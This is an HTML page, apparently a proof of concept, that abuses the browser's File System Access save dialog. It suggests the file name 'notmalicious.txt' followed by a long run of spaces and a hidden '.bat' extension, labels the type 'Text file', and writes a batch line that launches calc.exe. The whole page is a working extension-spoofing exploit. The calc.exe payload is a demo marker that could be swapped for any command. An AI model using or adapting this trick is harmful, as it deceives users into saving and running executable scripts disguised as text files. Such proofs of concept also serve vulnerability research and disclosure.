<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title>File System Access API - Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <h3>File System Access API Demo - Open Google and Save File</h3>

  <button id="openGoogle" style="font-size: 20px; margin: 10px;">1. Open Google.com</button>
  <button id="saveFile" style="font-size: 20px; margin: 10px;">2. Save File</button>

  <script>
    // Tombol 1: Buka Google
    document.getElementById('openGoogle').addEventListener('click', () => {
      window.open('https://www.google.com', '_blank');
    });

    // Tombol 2: Save File
    document.getElementById('saveFile').addEventListener('click', async () => {
      try {
        const options = {
          suggestedName: 'notmalicious.txt                                                                                           .bat',
          types: [
            {
              description: 'Text file',
              accept: { 'text/plain': ['.bat'] }
            }
          ]
        };

        const handle = await window.showSaveFilePicker(options);
        const writable = await handle.createWritable();
        await writable.write('C:\\Windows\\system32\\calc.exe');
        await writable.close();
        alert('File saved successfully.');
      } catch (err) {
        console.error('Save failed:', err);
      }
    });
  </script>
</body>

</html>
